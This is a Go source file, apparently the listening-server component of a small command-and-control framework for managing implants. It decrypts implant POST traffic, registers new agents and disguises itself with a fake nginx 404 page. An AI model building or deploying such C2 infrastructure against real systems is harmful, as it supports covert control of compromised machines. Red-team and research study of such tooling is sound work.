/*
	The bread loaf is the server of the breadcrumb C2. The load will have implants named 'slices'. Each user will be a
	crumb
*/

package ListeningServer

import (
	"AllSecure/ListeningServer/Common"
	"AllSecure/TeamServer/Crypt"
	"context"
	"encoding/binary"
	"github.com/gin-gonic/gin"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
)

type LS struct {
	Listener Common.ListeningServer
}

var (
	agent_arr   []Common.ImplantContext
	g_clientobj Common.Client
)

func ProcessRequest(c *gin.Context) {
	var (
		decryptedPayload []byte
	)
	body, err := io.ReadAll(c.Request.Body)
	if err != nil {
		panic(err)
	}
	defer c.Request.Body.Close()

	var data_package Common.Package
	err = data_package.UnmarshalBinary(body)
	if err != nil {
		log.Println("[Error] attempting to read data from http request", err)
		c.JSON(http.StatusInternalServerError, "Internal Server Error")
	}

	decryptedPayload, err = Crypt.AESDecryptPayload(data_package, "C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
	if err != nil {
		log.Println("[error] attempting to decrypt payload")
		c.JSON(http.StatusInternalServerError, "Internal Server Error")
	}

	var CMDID = binary.BigEndian.Uint32(data_package.CmdID)
	switch CMDID {
	case Common.CMD_Initialize:
		go func() {
			err = InitializeAgent(decryptedPayload)
			if err != nil {
				log.Println("[error] attempting to initialize agent", err)
			}
		}()
		break
		//CMD_Initialize(decryptedPayload)
	default:
		break
	} //switch

}

func DenyRequest(c *gin.Context) {
	c.Writer.WriteHeader(http.StatusNotFound)
	html, err := os.ReadFile("C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\ListeningServer\\Assets\\NotFound.html")
	if err != nil {
		log.Println("Could not load not found html file", err)
		c.JSON(http.StatusInternalServerError, "Internal Server Error")
	}
	c.Header("Server", "nginx")
	c.Header("Content-Type", "text/html")
	c.Writer.Write(html)
}

func (ls *LS) Start(token string) error {

	go func() {
		err := StartEventHandler(token, ls.Listener.TS.Address+":"+ls.Listener.TS.Port)
		if err != nil {
			log.Println("[error] attempting to start event handler", err)
			return
		}
	}()

	var err error
	ls.Listener.GinEngine.POST("/*endpoint", ProcessRequest)
	ls.Listener.GinEngine.GET("/*endpoint", DenyRequest)

	if ls.Listener.Config.Secure == true {

		err = os.WriteFile(ls.Listener.TLS.CertPath, ls.Listener.TLS.Cert, 0644)
		if err != nil {
			log.Fatalln("[error] Failed to save certificate", err)
		}
		err = os.WriteFile(ls.Listener.TLS.KeyPath, ls.Listener.TLS.Key, 0644)
		if err != nil {
			log.Fatalln("[error] Failed to save key path", err)
		}

		if err = ls.Listener.GinEngine.RunTLS(ls.Listener.Config.Address+":"+strconv.Itoa(ls.Listener.Config.Port),
			ls.Listener.TLS.CertPath, ls.Listener.TLS.KeyPath); err != nil {
			log.Fatalln("[error] failed to start websocket: ", err)
		}

	} else {
		err = ls.Listener.HttpServer.ListenAndServe()
		if err != nil {
			log.Println("[error] attempting to launch listening server", err)
			return err
		}
	}

	return nil
}

func (ls *LS) Stop() bool {
	var err error
	ctx, cancel := context.WithTimeout(context.Background(), 0)
	defer cancel()
	if ls.Listener.HttpServer.Close(); err != nil {
		log.Println("[error] attempting to close connections")
		return false
	}
	if err = ls.Listener.HttpServer.Shutdown(ctx); err != nil {
		log.Println("[error] server shutdown failed: ", err)
		return false
	}
	if err = os.Remove(ls.Listener.TLS.CertPath); err != nil {
		log.Println("[error] attempting to delete the server certificate file", err)
	}

	err = os.Remove(ls.Listener.TLS.KeyPath)
	if err != nil {
		log.Println("[error] attempting to delete the server key file", err)
	}
	return true

}
